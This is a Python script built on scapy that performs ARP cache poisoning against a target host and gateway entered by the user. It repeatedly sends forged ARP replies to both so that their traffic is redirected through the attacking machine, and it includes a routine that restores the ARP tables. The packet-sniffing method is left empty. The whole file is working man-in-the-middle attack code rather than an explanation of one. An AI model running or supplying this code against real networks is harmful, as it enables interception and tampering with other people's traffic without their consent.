import os
import sys
from multiprocessing import Process
import time
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,send, sniff, sndrcv, srp, wrpcap)

def get_target_mac(ip):
    packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has",pdst=ip)
    resp,_=srp(packet,timeout=2,retry=10,verbose=False)
    for _, r in resp:
        return(r[Ether].src)

class ArpPoison:
    def __init__(self,targip,gateway,interf='en0') -> None:
        self.target=targip
        self.targetMAC=get_target_mac(targip)
        self.gateway=gateway
        self.gatewayMAC=get_target_mac(gateway)
        self.iface=interf
        conf.verb=0
        print(f'initialized {interf}:')
        print(f'Gateway ({gateway}) is at {self.gatewayMAC}')
        print(f'Target is ({targip}) is at {self.targetMAC}')
        print('-'*60)
    
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread=Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_targ=ARP()
        poison_targ.op=2
        poison_targ.psrc=self.gateway
        poison_targ.pdst=self.target
        poison_targ.hwdst=self.targetMAC
        print(f'ip src: {poison_targ.psrc}')
        print(f'ip dst: {poison_targ.pdst}')
        print(f'mac dst: {poison_targ.hwdst}')
        print(f'mac src: {poison_targ.hwsrc}')
        print(poison_targ.summary())
        poison_gtw=ARP()
        poison_gtw.op=2
        poison_gtw.psrc=self.target
        poison_gtw.pdst=self.gateway
        poison_gtw.hwdst=self.gatewayMAC
        print(f'ip src: {poison_gtw.psrc}')
        print(f'ip dst: {poison_gtw.pdst}')
        print(f'mac dst: {poison_gtw.hwdst}')
        print(f'mac_src: {poison_gtw.hwsrc}')
        print(poison_gtw.summary())
        print('-'*60)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')      
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_targ)
                send(poison_gtw)
            except KeyboardInterrupt:
                self.restore()
                print("prova")
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self,count=200):
        pass

    def restore(self):
        print("Restoring ARP tables....")
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewayMAC,
                pdst=self.target,
                hwdst='ff:ff:ff:ff:ff:ff'),
                count=5)
        send(ARP(
                op=2,
                psrc=self.target,
                hwsrc=self.targetMAC,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),
                count=5)



if __name__=="__main__":
    #print(get_target_mac(input("ip:")))
    p=ArpPoison(input("target:"),input("gateway:"),input("intf:"))
    p.run()